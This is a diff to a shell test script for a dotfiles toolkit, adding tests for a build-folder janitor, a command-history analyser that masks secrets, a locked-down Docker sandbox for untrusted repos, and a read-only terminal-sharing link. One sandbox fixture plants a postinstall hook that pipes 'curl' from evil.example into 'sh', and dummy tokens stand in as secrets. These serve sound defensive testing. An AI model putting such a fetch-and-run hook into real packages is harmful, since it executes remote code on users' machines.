@@ -12,6 +12,7 @@ cd "$T" || exit 1   # never run the stand-ins inside the dotfiles repo
 export HOME="$T" XDG_CONFIG_HOME="$T/.config" XDG_DATA_HOME="$T/.local/share" XDG_CACHE_HOME="$T/.cache" XDG_STATE_HOME="$T/.local/state"
 export GIT_CONFIG_GLOBAL="$T/gitconfig" FAKE_LOG="$T/claude.log" ANTHROPIC_API_KEY=sk-ant-must-not-leak
 export PATH="$FB:$PATH" DOT_PROJECTS="$T/Github"
+export DOT_EVOLVE=0   # dot night run would queue the weekly evolve task; tested on its own below
 unset TERM_PROGRAM
 fails=0
 pass() { printf '  ✓ %s\n' "$*"; }
@@ -173,6 +174,155 @@ check "commit without AI attribution" '[[ "$out" == *"chore: adopt Kaine Forge t
 check "files it under the client" '[[ "$out" == *"clients --add acme ~/Github/portal"* ]]'
 check "bad names refused" '! bash "$S/dot-new" "Bad Name" --local --dry-run >/dev/null 2>&1'
 check "bad --id refused" '! bash "$S/dot-new" ok --local --dry-run --id "not valid" >/dev/null 2>&1'
+
+old() { # days path… — set modification times N days back (portable)
+    python3 -c 'import os,sys,time; t=time.time()-int(sys.argv[1])*86400; [os.utime(p,(t,t)) for p in sys.argv[2:]]' "$@"
+}
+ago_git() { echo "$(( $(date +%s) - $1 * 86400 )) +0000"; }
+
+echo "dot janitor"
+J="$T/jan"
+mkproj() { # name days
+    local r="$J/Github/$1" d
+    d="$(ago_git "$2")"
+    mkdir -p "$r/node_modules/pkg" "$r/dist" "$r/apps/web/.turbo" "$r/build"
+    git -C "$r" init -q
+    printf 'node_modules/\ndist/\n.turbo/\n' > "$r/.gitignore"
+    echo "x" > "$r/index.js"
+    echo "keep me" > "$r/build/tracked.txt"
+    dd if=/dev/zero of="$r/node_modules/pkg/blob" bs=1048576 count=25 2>/dev/null
+    echo c > "$r/apps/web/.turbo/cache"
+    git -C "$r" add -A
+    GIT_AUTHOR_DATE="$d" GIT_COMMITTER_DATE="$d" git -C "$r" commit -qm init
+    old "$2" "$r/.git/index" "$r/.git/HEAD" "$r/index.js" "$r/.gitignore"
+}
+mkproj stale 90
+mkproj fresh 1
+out=$(HOME="$J" DOT_PROJECTS="$J/Github" XDG_CONFIG_HOME="$J/.config" python3 "$S/dot-janitor" --list 2>&1)
+check "finds the stale project" '[[ "$out" == *"Github/stale"* && "$out" == *node_modules* ]]'
+check "leaves recent projects alone" '[[ "$out" != *"Github/fresh"* ]]'
+HOME="$J" DOT_PROJECTS="$J/Github" XDG_CONFIG_HOME="$J/.config" python3 "$S/dot-janitor" --yes >/dev/null 2>&1
+check "deletes ignored build folders" '[ ! -d "$J/Github/stale/node_modules" ] && [ ! -d "$J/Github/stale/dist" ] && [ ! -d "$J/Github/stale/apps/web/.turbo" ]'
+check "keeps code and tracked folders named build/" '[ -f "$J/Github/stale/index.js" ] && [ -f "$J/Github/stale/build/tracked.txt" ]'
+check "recent project untouched" '[ -d "$J/Github/fresh/node_modules" ]'
+
+echo "dot evolve"
+E="$T/evo.tsv"
+now=$(date '+%Y-%m-%d %H:%M:%S')
+: > "$E"
+for _ in 1 2 3 4; do printf '%s\t1\t3s\t%s\tpnpm test --filter api\n' "$now" "$T/Github/app" >> "$E"; done
+for _ in 1 2; do printf '%s\t127\t1ms\t%s\thttpie GET x\n' "$now" "$T" >> "$E"; done
+for _ in 1 2 3; do printf '%s\t0\t1s\t%s\ttldr tar\n' "$now" "$T" >> "$E"; done
+for d in 1 2 3; do
+    day=$(python3 -c "import datetime,sys; print((datetime.datetime.now()-datetime.timedelta(days=int(sys.argv[1]))).strftime('%Y-%m-%d'))" "$d")
+    printf '%s 09:01:00\t0\t1s\t%s\tdocker compose up -d db\n%s 09:02:00\t0\t5s\t%s\tpnpm db:migrate\n%s 09:03:00\t0\t1s\t%s\tgit pull --rebase\n' \
+        "$day" "$T/Github/app" "$day" "$T/Github/app" "$day" "$T/Github/app" >> "$E"
+done
+printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
+printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
+printf '%s\t1\t1s\t%s\tcurl -H "Authorization: Bearer abc123secret" https://x\n' "$now" "$T" >> "$E"
+export DOT_EVOLVE_FROM="$E" DOT_EVOLVE_NO_DOCTOR=1
+unset DOT_EVOLVE
+rm -f "$XDG_STATE_HOME/dotfiles/evolve-last"
+out=$(python3 "$S/dot-evolve")
+check "repeated failures" '[[ "$out" == *"pnpm test --filter api"*"4×"* ]]'
+check "command not found" '[[ "$out" == *"httpie"* ]]'
+check "repeated lookups" '[[ "$out" == *"tldr: tar"* ]]'
+check "morning ritual" '[[ "$out" == *"docker compose up"*"pnpm db:migrate"*"git pull"* ]]'
+check "secrets masked" '[[ "$out" != *abc123secret* ]]'
+# the dotfiles repo it improves (a throwaway one with an origin)
+git init -q --bare "$T/dots-origin.git"
+git clone -q "$T/dots-origin.git" "$T/Github/dotfiles" 2>/dev/null
+echo "# dots" > "$T/Github/dotfiles/README.md"
+git -C "$T/Github/dotfiles" add README.md && git -C "$T/Github/dotfiles" commit -qm "chore: init"
+git -C "$T/Github/dotfiles" push -q origin main
+export DOTFILES_DIR="$T/Github/dotfiles"
+python3 "$S/dot-evolve" --auto >/dev/null
+check "--auto queues a night task with the report" 'grep -q "\"kind\": \"evolve\"" "$XDG_DATA_HOME/dotfiles/night/queue.json" && grep -q "pnpm test --filter api" "$XDG_DATA_HOME/dotfiles/night/queue.json"'
+python3 "$S/dot-evolve" --auto; ls -la "$XDG_STATE_HOME/dotfiles/" >&2; env | grep -i evolve >&2
+check "only once a week" '[ "$(grep -c "\"kind\": \"evolve\"" "$XDG_DATA_HOME/dotfiles/night/queue.json")" = 1 ]'
+: > "$FAKE_LOG.gh"
+rm -f "$XDG_CACHE_HOME/dotfiles/claude-auth"
+py dot-night run >/dev/null 2>&1
+check "night shift opens the draft PR by itself" 'grep -q "pr create --draft" "$FAKE_LOG.gh" && py dot-night list | grep "evolve" | grep -q "pull/7"'
+check "the report never lands in the PR" '! grep -q "abc123secret\|pnpm test --filter" "$FAKE_LOG.gh"'
+unset DOT_EVOLVE_FROM DOT_EVOLVE_NO_DOCTOR DOTFILES_DIR
+export DOT_EVOLVE=0
+
+echo "dot try"
+cat > "$FB/docker" <<'EOF'
+#!/usr/bin/env bash
+echo "docker $*" >> "$FAKE_LOG.docker"
+db="$FAKE_LOG.db"; touch "$db"
+case "$1" in
+  info|start) exit 0 ;;
+  run) name=""; exp=""; prev=""
+       for a in "$@"; do
+         [ "$prev" = --name ] && name="$a"
+         case "$prev:$a" in --label:dot.try.expires=*) exp="${a#*=}" ;; esac
+         prev="$a"
+       done
+       echo "$name|$exp" >> "$db"; echo id ;;
+  exec) echo "EXEC $*" >> "$FAKE_LOG.docker"; echo "installed" ;;
+  ps) while IFS='|' read -r n e; do
+        case "$*" in *Status*) printf '%s\trepo\t%s\tUp\n' "$n" "$e" ;; *expires*) echo "$n $e" ;; *CreatedAt*) printf 'x\t%s\n' "$n" ;; *) echo "$n" ;; esac
+      done < "$db" ;;
+  inspect) grep -q "^$2|" "$db" ;;
+  rm) shift; [ "$1" = -f ] && shift; grep -v "^$1|" "$db" > "$db.t" || true; mv "$db.t" "$db" ;;
+esac
+EOF
+chmod +x "$FB/docker"
+R2="$T/sus"
+mkdir -p "$R2" && git -C "$R2" init -q
+echo '{"name":"sus","scripts":{"postinstall":"curl -s https://evil.example/x | sh"}}' > "$R2/package.json"
+echo "# Sus" > "$R2/README.md"
+echo "TOPSECRET" > "$T/secret.txt"
+ln -s "$T/secret.txt" "$R2/notes.md"
+git -C "$R2" add -A && git -C "$R2" commit -qm init
+: > "$FAKE_LOG"
+out=$(DOT_TRY_NO_TAB=1 bash "$S/dot-try" "$R2" 2>&1)
+check "sandbox ready" '[[ "$out" == *"Sandbox ready"* ]]'
+check "locked-down container" 'grep "docker run" "$FAKE_LOG.docker" | grep -q -- "--cap-drop ALL" && grep "docker run" "$FAKE_LOG.docker" | grep -q "no-new-privileges" && grep "docker run" "$FAKE_LOG.docker" | grep -q -- "--user"'
+check "only the repo is mounted" '[ "$(grep "docker run" "$FAKE_LOG.docker" | grep -o -- " -v " | wc -l | tr -d " ")" = 1 ] && ! grep "docker run" "$FAKE_LOG.docker" | grep -q "docker.sock"'
+check "installs inside the container" 'grep -q "EXEC .*npm ci" "$FAKE_LOG.docker"'
+check "tour flags the install hook" 'grep -q "postinstall" "$FAKE_LOG" && grep -q "evil.example" "$FAKE_LOG"'
+check "symlinks don't leak files into the tour" '! grep -q TOPSECRET "$FAKE_LOG"'
+check "tour goes through dot-ai (no API key)" 'grep -q "^KEY=unset" "$FAKE_LOG"'
+check "listed with time left" 'bash "$S/dot-try" list | grep -q "h left"'
+sed -i.bak 's/|[0-9][0-9]*$/|1000/' "$FAKE_LOG.db"
+bash "$S/dot-try" clean
+check "expired sandboxes are removed" '[ -z "$(cat "$FAKE_LOG.db")" ] && [ -z "$(ls -A "$XDG_CACHE_HOME/dotfiles/try" 2>/dev/null)" ]'
+
+echo "dot invite"
+if command -v tmux >/dev/null 2>&1; then
+    printf '#!/usr/bin/env bash\necho "ttyd $*" >> "$FAKE_LOG.inv"\nexec sleep 300\n' > "$FB/ttyd"
+    printf '#!/usr/bin/env bash\necho "cloudflared $*" >> "$FAKE_LOG.inv"\necho "INF |  https://quiet-otter.trycloudflare.com  |" >&2\nexec sleep 300\n' > "$FB/cloudflared"
+    chmod +x "$FB/ttyd" "$FB/cloudflared"
+    out=$(bash "$S/dot-invite" --for 30m 2>&1)
+    url=$(printf '%s' "$out" | grep -Eo 'https://quiet-otter\.trycloudflare\.com/[A-Za-z0-9_-]+/' | head -n 1)
+    check "public link with a secret path" '[ -n "$url" ] && [ ${#url} -gt 60 ]'
+    check "viewers attach read-only" 'grep -q "attach-session -r" "$FAKE_LOG.inv"'
+    check "ttyd only on this machine" 'grep -q -- "--interface 127.0.0.1" "$FAKE_LOG.inv" && grep -q -- "--base-path /" "$FAKE_LOG.inv"'
+    check "share mode on" 'grep -q "mode=share" "$XDG_STATE_HOME/dotfiles/mode"'
+    check "status" 'bash "$S/dot-invite" status | grep -q "min left"'
+    ttyd_pid=$(sed -n 's/^ttyd=//p' "$XDG_STATE_HOME/dotfiles/invite/current")
+    bash "$S/dot-invite" stop >/dev/null
+    gone() { # pid — exited (or a zombie nobody reaped yet) within 3 s
+        local i
+        for i in $(seq 1 30); do
+            kill -0 "$1" 2>/dev/null || return 0
+            ps -o stat= -p "$1" 2>/dev/null | grep -q Z && return 0
+            sleep 0.1
+        done
+        return 1
+    }
+    check "stop ends the link and share mode" 'gone "$ttyd_pid" && [ ! -f "$XDG_STATE_HOME/dotfiles/mode" ] && [ ! -f "$XDG_STATE_HOME/dotfiles/invite/current" ]'
+    check "too long is refused" '! bash "$S/dot-invite" --for 9h >/dev/null 2>&1'
+    tmux -L dot-invite kill-server 2>/dev/null || true
+    rm -f "$FB/ttyd" "$FB/cloudflared"
+else
+    echo "  - tmux not installed: skipped"
+fi
 
 [ -n "${KEEP:-}" ] || rm -rf "$T"; echo "T=$T"
 echo
